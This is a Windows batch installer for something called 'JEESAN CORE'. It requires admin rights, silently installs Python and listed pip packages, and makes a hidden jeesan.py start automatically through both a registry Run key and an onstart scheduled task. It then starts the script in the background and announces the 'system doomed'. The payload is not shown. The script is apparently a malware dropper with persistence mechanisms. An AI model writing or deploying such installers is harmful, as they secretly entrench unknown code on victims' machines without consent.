@echo off
title JEESAN CORE Windows Installer
echo [🔥] JEESAN CORE – Installing...

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Run as Administrator!
    pause & exit /b
)

where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Downloading Python...
    curl -L -o python-installer.exe https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe
    python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python-installer.exe
)

python -m pip install --upgrade pip
for /F "tokens=*" %%i in (requirements.txt) do python -m pip install %%i

set "PTH=%~dp0jeesan.py"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v JEESAN /t REG_SZ /d "\"python\" \"%PTH%\"" /f
schtasks /create /tn JEESAN /tr "\"python\" \"%PTH%\"" /sc onstart /f

start /B python "%PTH%"
echo [☠] JEESAN CORE running – system doomed.
pause
